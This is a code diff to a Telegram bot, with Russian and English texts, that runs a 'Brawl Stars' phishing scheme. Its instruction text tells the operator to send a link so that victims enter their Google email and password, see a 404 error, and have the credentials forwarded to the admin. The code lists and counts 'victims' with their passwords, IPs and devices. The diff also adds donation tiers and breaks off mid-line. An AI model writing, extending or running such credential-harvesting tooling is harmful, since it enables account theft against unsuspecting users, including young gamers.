@@ -17,13 +17,16 @@ admin_reply_context = {}
 # ========== ТЕКСТЫ ==========
 TEXTS = {
     'ru': {
-        'start_user': "🎉 **Добро пожаловать!** 🎉\n\n🔹 Используй кнопки ниже для связи с администратором.\n🔹 По всем вопросам создавай тикет — ответят в ближайшее время.\n\n📩 **Поддержка**\n\nНажми кнопку ниже, чтобы создать тикет. Администратор ответит в этом чате.",
+        'start_user': "🎉 **Добро пожаловать!** 🎉\n\n🔹 Используй кнопки ниже для связи с администратором.\n🔹 По всем вопросам создавай тикет — ответят в ближайшее время.",
         'start_admin': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Фишинг-ссылка:**\n`{url}`\n\n👨‍💼 **Поймано жертв:** {count}\n\n📌 Отправь ссылку жертве — данные придут сюда.",
         'instruction': "📖 **ИНСТРУКЦИЯ**\n\n1️⃣ Отправь ссылку жертве\n2️⃣ Жертва вводит почту и пароль Google\n3️⃣ Данные приходят сюда\n4️⃣ Жертва видит ошибку 404\n\n⚠️ Ссылка всегда одна: {url}",
         'data_empty': "📭 **Нет данных**\n\nПока нет ни одной жертвы.",
-        'data_title': "👥 **Пойманные жертвы:**\n\n",
+        'data_title': "👥 **Последние 5 жертв:**\n\n",
         'stats': "📊 **СТАТИСТИКА**\n\n👨‍💼 Всего жертв: {total}\n🌐 Уникальных IP: {unique}",
-        'donate': "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nНажми на кнопку ниже, чтобы отправить **50 Telegram Stars**.\n\n⭐ Telegram Stars — официальная поддержка.\n💰 50 звёзд ≈ 100 рублей\n\nСпасибо за поддержку! 💙",
+        'donate': "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nВыбери сумму доната:",
+        'donate_25': "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nНажми на кнопку ниже, чтобы отправить **25 Telegram Stars**.\n\n⭐ 25 звёзд ≈ 50 рублей\n\nСпасибо за поддержку! 💙",
+        'donate_50': "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nНажми на кнопку ниже, чтобы отправить **50 Telegram Stars**.\n\n⭐ 50 звёзд ≈ 100 рублей\n\nСпасибо за поддержку! 💙",
+        'donate_100': "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nНажми на кнопку ниже, чтобы отправить **100 Telegram Stars**.\n\n⭐ 100 звёзд ≈ 200 рублей\n\nСпасибо за поддержку! 💙",
         'ticket_created': "✅ **Тикет создан!**\n\nНапиши свой вопрос ниже. Администратор ответит в этом чате.\n\n⚠️ У тебя активен один тикет. Чтобы создать новый, закрой текущий командой /close.",
         'ticket_already_active': "❌ **У тебя уже есть активный тикет!**\n\nДождись ответа администратора или закрой старый тикет командой /close.",
         'ticket_closed': "✅ **Тикет закрыт!**\n\nЕсли остались вопросы — создай новый тикет кнопкой ниже.",
@@ -39,10 +42,9 @@ TEXTS = {
         'language_changed': "✅ Язык: Русский",
         'language_changed_en': "✅ Language: English",
         'settings': "⚙️ **НАСТРОЙКИ**\n\nВыбери язык:",
-        'support': "📩 **Поддержка**\n\nНажми кнопку ниже, чтобы создать тикет. Администратор ответит в этом чате.",
+        'support_text': "📩 **Поддержка**\n\nНажми кнопку ниже, чтобы создать тикет. Администратор ответит в этом чате.",
         'close_command': "❌ У вас нет активного диалога с пользователем.",
         'new_message_to_admin': "✅ Сообщение отправлено администратору. Ответ придёт сюда.",
-        'ticket_closed_by_admin': "❌ У вас нет активного диалога с пользователем.",
         'btn_data': "📋 Данные жертв",
         'btn_stats': "📊 Статистика",
         'btn_donate': "⭐ Поддержать автора",
@@ -54,16 +56,21 @@ TEXTS = {
         'btn_reply': "✏️ Ответить",
         'btn_lang_ru': "🇷🇺 Русский",
         'btn_lang_en': "🇬🇧 English",
-        'btn_donate_link': "⭐ Отправить 50 звёзд"
+        'btn_donate_25': "⭐ 25 звёзд",
+        'btn_donate_50': "⭐ 50 звёзд",
+        'btn_donate_100': "⭐ 100 звёзд"
     },
     'en': {
-        'start_user': "🎉 **Welcome!** 🎉\n\n🔹 Use buttons below to contact admin.\n🔹 For any questions, create a ticket — you'll get a reply soon.\n\n📩 **Support**\n\nPress the button below to create a ticket. Admin will answer in this chat.",
+        'start_user': "🎉 **Welcome!** 🎉\n\n🔹 Use buttons below to contact admin.\n🔹 For any questions, create a ticket — you'll get a reply soon.",
         'start_admin': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Phishing link:**\n`{url}`\n\n👨‍💼 **Victims caught:** {count}\n\n📌 Send the link to victim — data will come here.",
         'instruction': "📖 **INSTRUCTION**\n\n1️⃣ Send link to victim\n2️⃣ Victim enters Google email and password\n3️⃣ Data comes here\n4️⃣ Victim sees 404 error\n\n⚠️ Link is always the same: {url}",
         'data_empty': "📭 **No data**\n\nNo victims yet.",
-        'data_title': "👥 **Victims caught:**\n\n",
+        'data_title': "👥 **Last 5 victims:**\n\n",
         'stats': "📊 **STATISTICS**\n\n👨‍💼 Total victims: {total}\n🌐 Unique IPs: {unique}",
-        'donate': "✨ **SUPPORT THE AUTHOR** ✨\n\nClick the button below to send **50 Telegram Stars**.\n\n⭐ Telegram Stars is official support.\n💰 50 stars ≈ $1\n\nThank you for your support! 💙",
+        'donate': "✨ **SUPPORT THE AUTHOR** ✨\n\nChoose donation amount:",
+        'donate_25': "✨ **SUPPORT THE AUTHOR** ✨\n\nClick the button below to send **25 Telegram Stars**.\n\n⭐ 25 stars ≈ $0.5\n\nThank you for your support! 💙",
+        'donate_50': "✨ **SUPPORT THE AUTHOR** ✨\n\nClick the button below to send **50 Telegram Stars**.\n\n⭐ 50 stars ≈ $1\n\nThank you for your support! 💙",
+        'donate_100': "✨ **SUPPORT THE AUTHOR** ✨\n\nClick the button below to send **100 Telegram Stars**.\n\n⭐ 100 stars ≈ $2\n\nThank you for your support! 💙",
         'ticket_created': "✅ **Ticket created!**\n\nWrite your question below. Admin will answer in this chat.\n\n⚠️ You have one active ticket. To create a new one, close the current one with /close.",
         'ticket_already_active': "❌ **You already have an active ticket!**\n\nWait for admin response or close old ticket with /close.",
         'ticket_closed': "✅ **Ticket closed!**\n\nIf you have more questions — create a new ticket using the button below.",
@@ -79,10 +86,9 @@ TEXTS = {
         'language_changed': "✅ Language: English",
         'language_changed_ru': "✅ Язык: Русский",
         'settings': "⚙️ **SETTINGS**\n\nChoose language:",
-        'support': "📩 **Support**\n\nPress the button below to create a ticket. Admin will answer in this chat.",
+        'support_text': "📩 **Support**\n\nPress the button below to create a ticket. Admin will answer in this chat.",
         'close_command': "❌ You have no active dialog with user.",
         'new_message_to_admin': "✅ Message sent to admin. Reply will come here.",
-        'ticket_closed_by_admin': "❌ You have no active dialog with user.",
         'btn_data': "📋 Victim data",
         'btn_stats': "📊 Statistics",
         'btn_donate': "⭐ Support author",
@@ -94,7 +100,9 @@ TEXTS = {
         'btn_reply': "✏️ Reply",
         'btn_lang_ru': "🇷🇺 Русский",
         'btn_lang_en': "🇬🇧 English",
-        'btn_donate_link': "⭐ Send 50 stars"
+        'btn_donate_25': "⭐ 25 stars",
+        'btn_donate_50': "⭐ 50 stars",
+        'btn_donate_100': "⭐ 100 stars"
     }
 }
 
@@ -145,23 +153,39 @@ def get_main_keyboard(chat_id):
     else:
         return [
             [{"text": get_button_text(chat_id, 'btn_support'), "callback_data": "create_ticket"}],
-            [{"text": get_button_text(chat_id, 'btn_instruction'), "callback_data": "instruction"}]
+            [{"text": get_button_text(chat_id, 'btn_instruction'), "callback_data": "instruction"}, {"text": get_button_text(chat_id, 'btn_settings'), "callback_data": "settings"}]
         ]
 
 def get_back_keyboard(chat_id):
     return [[{"text": get_button_text(chat_id, 'btn_back'), "callback_data": "back"}]]
 
-def get_language_keyboard():
+def get_language_keyboard(chat_id):
     return [
-        [{"text": TEXTS['ru']['btn_lang_ru'], "callback_data": "lang_ru"}, {"text": TEXTS['en']['btn_lang_en'], "callback_data": "lang_en"}],
-        [{"text": TEXTS['ru']['btn_back'], "callback_data": "back"}]
+        [{"text": get_button_text(chat_id, 'btn_lang_ru'), "callback_data": "lang_ru"}, {"text": get_button_text(chat_id, 'btn_lang_en'), "callback_data": "lang_en"}],
+        [{"text": get_button_text(chat_id, 'btn_back'), "callback_data": "back"}]
+    ]
+
+def get_donate_keyboard(chat_id):
+    return [
+        [{"text": get_button_text(chat_id, 'btn_donate_25'), "callback_data": "donate_25"}],
+        [{"text": get_button_text(chat_id, 'btn_donate_50'), "callback_data": "donate_50"}],
+        [{"text": get_button_text(chat_id, 'btn_donate_100'), "callback_data": "donate_100"}],
+        [{"text": get_button_text(chat_id, 'btn_back'), "callback_data": "back"}]
     ]
 
 def get_ticket_keyboard(chat_id, ticket_id):
     return [[{"text": get_button_text(chat_id, 'btn_close'), "callback_data": f"close_ticket_{ticket_id}"}]]
 
+def get_victims_keyboard(chat_id, victims_list):
+    keyboard = []
+    for i, v in enumerate(victims_list[:5]):
+        victim_id = len(victims) - i - 1  # уникальный ID для callback
+        keyboard.append([{"text": f"📧 {v['email'][:20]}...", "callback_data": f"victim_{victim_id}"}])
+    keyboard.append([{"text": get_button_text(chat_id, 'btn_back'), "callback_data": "back"}])
+    return keyboard
+
 def get_admin_reply_keyboard(user_id, username, ticket_id):
-    return [[{"text": TEXTS['ru']['btn_reply'], "callback_data": f"admin_reply_{user_id}_{username}_{ticket_id}"}]]
+    return [[{"text": get_button_text(ADMIN_ID, 'btn_reply'), "callback_data": f"admin_reply_{user_id}_{username}_{ticket_id}"}]]
 
 def generate_ticket_id():
     return int(time.time()) % 1000000
@@ -304,51 +328,21 @@ while True:
                     answer_callback(callback_id)
 
                 elif data == "donate":
+                    edit_message(chat_id, message_id, get_text(chat_id, 'donate'), get_donate_keyboard(chat_id))
+                    answer_callback(callback_id)
+
+                elif data == "donate_25":
+                    donate_link = "https://t.me/telegram?start=star25"
+                    keyboard = [[{"text": get_button_text(chat_id, 'btn_donate_25'), "url": donate_link}]]
+                    edit_message(chat_id, message_id, get_text(chat_id, 'donate_25'), keyboard)
+                    answer_callback(callback_id)
+
+                elif data == "donate_50":
                     donate_link = "https://t.me/telegram?start=star50"
-                    keyboard = [[{"text": get_button_text(chat_id, 'btn_donate_link'), "url": donate_link}]]
-                    edit_message(chat_id, message_id, get_text(chat_id, 'donate'), keyboard)
+                    keyboard = [[{"text": get_button_text(chat_id, 'btn_donate_50'), "url": donate_link}]]
+                    edit_message(chat_id, message_id, get_text(chat_id, 'donate_50'), keyboard)
                     answer_callback(callback_id)
 
-                elif data == "instruction":
-                    edit_message(chat_id, message_id, get_text(chat_id, 'instruction', url=PHISHING_URL), get_back_keyboard(chat_id))
-                    answer_callback(callback_id)
-
-                elif data == "settings":
-                    edit_message(chat_id, message_id, get_text(chat_id, 'settings'), get_language_keyboard())
-                    answer_callback(callback_id)
-
-                elif data == "lang_ru":
-                    user_language[chat_id] = 'ru'
-                    edit_message(chat_id, message_id, get_text(chat_id, 'language_changed'), get_back_keyboard(chat_id))
-                    answer_callback(callback_id)
-
-                elif data == "lang_en":
-                    user_language[chat_id] = 'en'
-                    edit_message(chat_id, message_id, get_text(chat_id, 'language_changed_en'), get_back_keyboard(chat_id))
-                    answer_callback(callback_id)
-
-                elif data == "data" and chat_id == ADMIN_ID:
-                    if not victims:
-                        edit_message(chat_id, message_id, get_text(chat_id, 'data_empty'), get_back_keyboard(chat_id))
-                    else:
-                        txt = get_text(chat_id, 'data_title')
-                        for v in victims[-30:]:
-                            txt += f"📧 {v['email']}\n🔑 {v['password']}\n📡 {v['ip']}\n📱 {v['device']}\n⏰ {v['time']}\n"
-                            txt += "─" * 30 + "\n"
-                        if len(txt) > 4000:
-                            txt = txt[:3900] + "\n...(обрезано)"
-                        edit_message(chat_id, message_id, txt, get_back_keyboard(chat_id))
-                    answer_callback(callback_id)
-
-                elif data == "stats" and chat_id == ADMIN_ID:
-                    unique_ips = len(set(v.get('ip') for v in victims if v.get('ip')))
-                    edit_message(chat_id, message_id, get_text(chat_id, 'stats', total=len(victims), unique=unique_ips), get_back_keyboard(chat_id))
-                    answer_callback(callback_id)
-
-                else:
-                    answer_callback(callback_id)
-
-        time.sleep(1)
-
-    except Exception as e:
-        pr
+                elif data == "donate_100":
+                    donate_link = "https://t.me/telegram?start=star100"
+                    keyboard 
